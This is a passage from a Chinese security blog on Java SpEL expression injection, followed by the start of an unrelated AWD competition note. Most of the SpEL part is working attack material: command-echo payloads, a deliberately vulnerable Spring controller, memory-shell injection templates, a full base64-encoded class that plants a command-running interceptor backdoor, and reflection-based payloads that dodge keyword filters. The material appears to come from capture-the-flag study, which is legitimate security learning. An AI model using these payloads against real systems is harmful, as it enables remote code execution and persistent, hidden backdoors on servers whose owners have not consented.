id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h4><p>和Buffer一样，都只能算得上是半回显<br><code>new java.util.Scanner(new java.lang.ProcessBuilder(&quot;cmd&quot;, &quot;/c&quot;, &quot;dir&quot;, &quot;.\\&quot;).start().getInputStream(), &quot;GBK&quot;).useDelimiter(&quot;asdasdasdasd&quot;).next()</code><br>这里的<code>Delimiter</code>是分隔符的意思，我们执行了dir指令，假如想让回显全部显示在一行。那么我们给一点乱七八糟的东西即可</p><p><img src="../images/image-20230907153640438.png" alt="image-20230907153640438"></p><h4 id="ResponseHeader"><a href="#ResponseHeader" class="headerlink" title="ResponseHeader"></a>ResponseHeader</h4><p>上面的方法用的话一般都是得通过这个return将结果给输出出来  但是在真实环境中 是不会存在这个东西的</p><p><strong>(其实也和内存马获取那个全局变量差不多   也是获取这个全局的response)</strong></p><p>这种方法才称得上是通用回显<br>这种方法需要有一个方法可以addHeader，可是springboot并不自带这个方法。因此获取到Response有些许困难，需要注册一个response进上下文</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.ke1nys;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.Expression;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.SpelParserConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.support.StandardEvaluationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpelController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/spel&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">spelvul</span><span class="params">(String payload, HttpServletResponse response)</span>&#123;</span><br><span class="line">        StandardEvaluationContext context=<span class="keyword">new</span> <span class="title class_">StandardEvaluationContext</span>();</span><br><span class="line">        context.setVariable(<span class="string">&quot;response&quot;</span>,response);</span><br><span class="line">        <span class="comment">//String cmdStr = &quot;T(java.lang.ClassLoader).getSystemClassLoader().loadClass(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;;</span></span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>(<span class="keyword">new</span> <span class="title class_">SpelParserConfiguration</span>());<span class="comment">//创建解析器</span></span><br><span class="line">        <span class="type">Expression</span> <span class="variable">exp</span> <span class="operator">=</span> parser.parseExpression(payload);<span class="comment">//解析表达式</span></span><br><span class="line">        <span class="keyword">return</span> (String) exp.getValue(context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230911144740721.png" alt="image-20230911144740721"></p><p>这样就可以把命令执行的结果外带出来了。这种方法是比较轻便的。还是围绕着如何获取response这个点。</p><p><strong>(既然可以使用Standard这个点来获取response的关系后  那么我觉得内存马的话应该也是可以进行注入的)</strong></p><h3 id="注入内存马"><a href="#注入内存马" class="headerlink" title="注入内存马"></a>注入内存马</h3><p>这里的话是有两个paylaod模板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;Memshell&#x27;,T(org.springframework.util.Base64Utils).decodeFromString(&#x27;yv66vgAAA....&#x27;),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;InceptorMemShell&#x27;,T(org.springframework.util.Base64Utils).decodeFromString(&#x27;Base64&#x27;),T(java.lang.Thread).currentThread().getContextClassLoader()).newInstance()</span><br></pre></td></tr></table></figure><p>这里使用的是<code>sping</code>的<code>InceptorMemShell</code>内存马进行注入</p><p>(这里的话我是在虚拟机里重新搭建一个idea来编译的  因为本机环境是17 不敢瞎几把改  上次就改烂了。。。。。。。。。。)</p><p>编译完后拖到本机 </p><p><img src="../images/image-20230912091610166.png" alt="image-20230912091610166"></p><p>然后将字节码进行base64编码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.ke1nys;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.Base64Utils;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> <span class="string">&quot;D:\\ctf application\\idea_vip\\IntelliJ IDEA 2022.2.2\\project\\Ke1nys\\src\\main\\java\\com\\example\\ke1nys\\InceptorMemShell.class&quot;</span>; <span class="comment">// 替换为你的 class 文件路径</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 读取 class 文件的内容</span></span><br><span class="line">            <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(filePath);</span><br><span class="line">            <span class="type">byte</span>[] fileBytes = Files.readAllBytes(path);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 对 class 文件进行 Base64 编码</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">encodedString</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(fileBytes);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 输出 Base64 编码后的内容</span></span><br><span class="line">            System.out.println(encodedString);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后将base64编码写入payload中发包就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;InceptorMemShell&#x27;,T(org.springframework.util.Base64Utils).decodeFromString(&#x27;yv66vgAAADQBAQoAOwCLCABWCwCMAI0IAI4LAI8AkAsAjwCRCACSCACTCgCUAJUKAA4AlggAlwoADgCYBwCZBwCaCACbCACcCgANAJ0IAJ4IAJ8HAKAKAA0AoQoAogCjCgAUAKQIAKUKABQApgoAFACnCgAUAKgKABQAqQoAqgCrCgCqAKwKAKoAqQcArQoAIACuCwA8AK8LADwAsAkAlACxCACyCgCzAKsKALQAtQgAtgsAtwC4BwC5BwC6CwAqALsHALwIAL0KAL4AvwcAwAoAMACuCgDBAMIKAMEAwwcAxAcAxQoANQCuBwDGCgA3AIsLADQAxwgAyAcAyQcAygEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQASTEluY2VwdG9yTWVtU2hlbGw7AQAJcHJlSGFuZGxlAQBkKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDspWgEAB2J1aWxkZXIBABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEAC3ByaW50V3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQABbwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAWMBABNMamF2YS91dGlsL1NjYW5uZXI7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdoYW5kbGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQADY21kAQANU3RhY2tNYXBUYWJsZQcAxgcAywcAzAcAzQcAmgcAzgcAmQcAoAcArQEACkV4Y2VwdGlvbnMBABBNZXRob2RQYXJhbWV0ZXJzAQAKcG9zdEhhbmRsZQEAkihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvTW9kZWxBbmRWaWV3OylWAQAMbW9kZWxBbmRWaWV3AQAuTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvTW9kZWxBbmRWaWV3OwEAD2FmdGVyQ29tcGxldGlvbgEAeShMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9FeGNlcHRpb247KVYBAAJleAEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAM8BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BACBMamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uOwEAIkxqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbjsBAAdjb250ZXh0AQA3TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0OwEAFW1hcHBpbmdIYW5kbGVyTWFwcGluZwEAVExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nOwEABWZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAEWFkYXB0SW50ZXJjZXB0b3JzAQAQTGphdmEvdXRpbC9MaXN0OwEAD2V2aWxJbnRlcmNlcHRvcgEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBAEZMamF2YS91dGlsL0xpc3Q8TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvSGFuZGxlckludGVyY2VwdG9yOz47BwC5BwC6BwDQBwDABwDEBwDFAQAKU291cmNlRmlsZQEAFUluY2VwdG9yTWVtU2hlbGwuamF2YQwAPQA+BwDLDADRANIBAANnYmsHAMwMANMA1AwA1QDWAQAAAQAHb3MubmFtZQcA1wwA2ADSDADZANoBAAN3aW4MANsA3AEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMAD0A3QEACS9iaW4vYmFzaAEAAi1jAQARamF2YS91dGlsL1NjYW5uZXIMAN4A3wcA4AwA4QDiDAA9AOMBAA13b2Nhb3NpbmlkZW1hDADkAOUMAOYA5wwA6ADaDADpAD4HAM4MAOoA1AwA6wA+AQATamF2YS9sYW5nL0V4Y2VwdGlvbgwA7AA+DABjAGQMAGcAaAwA7QDuAQAGc3RhYXJ0BwDvBwDwDADxAPIBADlvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5zZXJ2bGV0LkRpc3BhdGNoZXJTZXJ2bGV0LkNPTlRFWFQHAPMMAPQA9QEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0AQBSb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL2Fubm90YXRpb24vUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwwA9gD3AQA+b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9oYW5kbGVyL0Fic3RyYWN0SGFuZGxlck1hcHBpbmcBABNhZGFwdGVkSW50ZXJjZXB0b3JzBwD4DAD5APoBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24HANAMAPsA/AwA/QD+AQAOamF2YS91dGlsL0xpc3QBACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgEAEEluY2VwdG9yTWVtU2hlbGwMAP8BAAEAAm9rAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAMm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvSGFuZGxlckludGVyY2VwdG9yAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvaW8vUHJpbnRXcml0ZXIBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAUc2V0Q2hhcmFjdGVyRW5jb2RpbmcBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAKihMamF2YS9pby9JbnB1dFN0cmVhbTtMamF2YS9sYW5nL1N0cmluZzspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAdwcmludGxuAQAFZmx1c2gBAA9wcmludFN0YWNrVHJhY2UBAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQA8b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RDb250ZXh0SG9sZGVyAQAYY3VycmVudFJlcXVlc3RBdHRyaWJ1dGVzAQA9KClMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzOwEAOW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlcwEADGdldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztJKUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldEJlYW4BACUoTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9PYmplY3Q7AQAPamF2YS9sYW5nL0NsYXNzAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAANhZGQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoAIQA3ADsAAQA8AAAABwABAD0APgABAD8AAAAvAAEAAQAAAAUqtwABsQAAAAIAQAAAAAYAAQAAABQAQQAAAAwAAQAAAAUAQgBDAAAAAQBEAEUAAwA/AAACBQAGAAkAAAC+KxICuQADAgA6BBkExgCwLBIEuQAFAgAsuQAGAQA6BRIHOgcSCLgACbYAChILtgAMmQAiuwANWQa9AA5ZAxIPU1kEEhBTWQUZBFO3ABE6BqcAH7sADVkGvQAOWQMSElNZBBITU1kFGQRTtwAROga7ABRZGQa2ABW2ABYSBLcAFxIYtgAZOggZCLYAGpkACxkItgAbpwAFGQc6BxkItgAcGQUZB7YAHRkFtgAeGQW2AB+nAAo6BRkFtgAhA6wErAABAA8AsACzACAAAwBAAAAATgATAAAALwAKADAADwAyABcAMwAfADUAIwA2ADMANwBSADkAbgA7AIYAPACaAD0AnwA+AKYAPwCrAEAAsABDALMAQQC1AEIAugBEALwARgBBAAAAcAALAE8AAwBGAEcABgAfAJEASABJAAUAbgBCAEYARwAGACMAjQBKAEsABwCGACoATABNAAgAtQAFAE4ATwAFAAAAvgBCAEMAAAAAAL4AUABRAAEAAAC+AFIAUwACAAAAvgBUAFUAAwAKALQAVgBLAAQAVwAAAGMAB/8AUgAIBwBYBwBZBwBaBwBbBwBcBwBdAAcAXAAA/wAbAAgHAFgHAFkHAFoHAFsHAFwHAF0HAF4HAFwAAPwAJwcAX0EHAFz/ABoABQcAWAcAWQcAWgcAWwcAXAABBwBgBgEAYQAAAAQAAQAgAGIAAAANAwBQAAAAUgAAAFQAAAABAGMAZAADAD8AAABgAAUABQAAAAoqKywtGQS3ACKxAAAAAgBAAAAACgACAAAASwAJAEwAQQAAADQABQAAAAoAQgBDAAAAAAAKAFAAUQABAAAACgBSAFMAAgAAAAoAVABVAAMAAAAKAGUAZgAEAGEAAAAEAAEAIABiAAAAEQQAUAAAAFIAAABUAAAAZQAAAAEAZwBoAAMAPwAAAGAABQAFAAAACiorLC0ZBLcAI7EAAAACAEAAAAAKAAIAAABQAAkAUQBBAAAANAAFAAAACgBCAEMAAAAAAAoAUABRAAEAAAAKAFIAUwACAAAACgBUAFUAAwAAAAoAaQBPAAQAYQAAAAQAAQAgAGIAAAARBABQAAAAUgAAAFQAAABpAAAAAQBqAGsAAwA/AAAAPwAAAAMAAAABsQAAAAIAQAAAAAYAAQAAAFYAQQAAACAAAwAAAAEAQgBDAAAAAAABAGwAbQABAAAAAQBuAG8AAgBhAAAABAABAHAAYgAAAAkCAGwAAABuAAAAAQBqAHEAAwA/AAAASQAAAAQAAAABsQAAAAIAQAAAAAYAAQAAAFsAQQAAACoABAAAAAEAQgBDAAAAAAABAGwAbQABAAAAAQByAHMAAgAAAAEAVAB0AAMAYQAAAAQAAQBwAGIAAAANAwBsAAAAcgAAAFQAAAAIAHUAPgABAD8AAAFpAAMABQAAAGqyACQSJbYAJrgAJxIoA7kAKQMAwAAqSyoSK7kALAIAwAArTAFNEi0SLrYAL02nAAhOLbYAMSwEtgAyAU4sK7YAM8AANE6nAAo6BBkEtgA2uwA3WbcAODoELRkEuQA5AgBXsgAkEjq2ACaxAAIAJQAtADAAMAA8AEUASAA1AAQAQAAAAEoAEgAAABcACAAYABcAGQAjABoAJQAcAC0AHwAwAB0AMQAeADUAIAA6ACEAPAAjAEUAJgBIACQASgAlAE8AJwBYACgAYQApAGkAKgBBAAAASAAHADEABABOAHYAAwBKAAUATgB3AAQAFwBSAHgAeQAAACMARgB6AHsAAQAlAEQAfAB9AAIAPAAtAH4AfwADAFgAEQCAAEMABACBAAAADAABADwALQB+AIIAAwBXAAAALQAE/wAwAAMHAIMHAIQHAIUAAQcAhgT/ABIABAcAgwcAhAcAhQcAhwABBwCIBgABAIkAAAACAIo=&#x27;),T(java.lang.Thread).currentThread().getContextClassLoader()).newInstance()</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230912091750603.png" alt="image-20230912091750603"></p><p><img src="../images/image-20230912091736399.png" alt="image-20230912091736399"></p><p><strong>还是再说一点 在使用字节码进行动态类加载的时候  编译的时候不要加上package</strong></p><p><strong>(还有就是java发包的时候记得将payload进行url编码)</strong></p><h3 id="关键字bypass"><a href="#关键字bypass" class="headerlink" title="关键字bypass"></a>关键字bypass</h3><h4 id="字符串替换"><a href="#字符串替换" class="headerlink" title="字符串替换"></a>字符串替换</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">T(String).getName()[0].replace(106,104)+T(String).getName()[0].replace(106,51)+T(String).getName()[0].replace(106,122)+T(String).getName()[0].replace(106,104)+T(String).getName()[0].replace(106,49)</span><br><span class="line">#回显h3zh1</span><br></pre></td></tr></table></figure><p><code>T(String).getName</code>返回的是<code>java.lang.String</code>，然后用replace替换获取想要的字符串，这种比较麻烦。</p><p>还有一种就是直接使用类似<code>chr</code>函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(Character).toString(104)+T(Character).toString(51)+T(Character).toString(122)+T(Character).toString(104)+T(Character).toString(49)</span><br></pre></td></tr></table></figure><h4 id="外部对象request"><a href="#外部对象request" class="headerlink" title="外部对象request"></a>外部对象request</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//request.getMethod()为POST</span><br><span class="line"></span><br><span class="line">#request.getMethod().substring(0,1).replace(80,104)%2b#request.getMethod().substring(0,1).replace(80,51)%2b#request.getMethod().substring(0,1).replace(80,122)%2b#request.getMethod().substring(0,1).replace(80,104)%2b#request.getMethod().substring(0,1).replace(80,49)</span><br><span class="line">//request.getMethod()为GET</span><br><span class="line"></span><br><span class="line">#request.getMethod().substring(0,1).replace(71,104)%2b#request.getMethod().substring(0,1).replace(71,51)%2b#request.getMethod().substring(0,1).replace(71,122)%2b#request.getMethod().substring(0,1).replace(71,104)%2b#request.getMethod().substring(0,1).replace(71,49)</span><br><span class="line"></span><br><span class="line">//Cookie</span><br><span class="line">#request.getRequestedSessionId()</span><br></pre></td></tr></table></figure><h4 id="反射-字符串拼贴"><a href="#反射-字符串拼贴" class="headerlink" title="反射+字符串拼贴"></a>反射+字符串拼贴</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">比如Runtime的绕过</span><br><span class="line">T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),newString[]&#123;&quot;cmd&quot;,&quot;/C&quot;,&quot;calc&quot;&#125;)</span><br><span class="line">如果ban了getClass还可以getSuperClass</span><br><span class="line">&#x27;&#x27;.class.getSuperclass().class.forName(&#x27;java.lang.Runtime&#x27;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(&#x27;&#x27;.class.getSuperclass().class.forName(&#x27;java.lang.Runtime&#x27;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(null),&#x27;calc&#x27;)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考文章&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2023/08/06/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%9B%9</summary>
      
    
    
    
    
    <category term="java-SpEL表达式注入" scheme="https://ke1nys.github.io/tags/java-SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>AWD-初学习</title>
    <link href="https://ke1nys.github.io/posts/6eda4bbf.html"/>
    <id>https://ke1nys.github.io/posts/6eda4bbf.html</id>
    <published>2023-08-24T14:48:29.000Z</published>
    <updated>2023-09-01T06:51:04.794Z</updated>
    
    <content type="html"><![CDATA[<p>php可以直接进行修改  不用重启服务  </p><p>java需要重启 就是先将jar包下载下来  然后使用codeqlpy工具进行扫描  然后进行修改 然后编译后 将代码进行替换(就是有问题的class)  然后找到jar所在的进程(<code>ps aux|grep JavaMaster.jar</code>  ) 找到之后  然后kill掉进程就行(<code>kill 进程号</code>) 然后在把修改好的上传上来  进行<code>nohup java -jar JavaMaster.jar &gt; log.txt &amp;</code>  使其在后台进行运行 </p><p><img src="../images/image-20230825223910436.png" alt="image-20230825223910436"></p><p><img src="../images/image-20230825223842646.png" alt="image-20230825223842646"></p><p><img src="../images/image-20230825223922228.png" alt="image-20230825223922228"></p><p>(上面的图片先留着  先不删 到时候主要用xftp)</p><p>查看端口被谁占用        <code>lsof -i:8080</code></p><p>查找目标进程的pid   <code>ps -aux |grep xxx.jar</code></p><p><strong>第一点就是就是开局前有45分钟加固时间</strong></p><ul><li>必须先进行密码的修改   </li></ul><p>ssh mysql redis  网站后台 </p><p><img src="../images/image-20230826221532629.png" alt="image-20230826221532629"></p><p><strong>启动mysql的方法  还有修改登录密码的方法</strong></p><p><img src="../images/image-20230826221603006.png" alt="image-20230826221603006"></p><p>这是开启的方法</p><p>接下来是redis的登录方法</p><p><img src="../images/image-20230826222126127.png" alt="image-20230826222126127"></p><p><strong>redis修改密码</strong></p><p><img 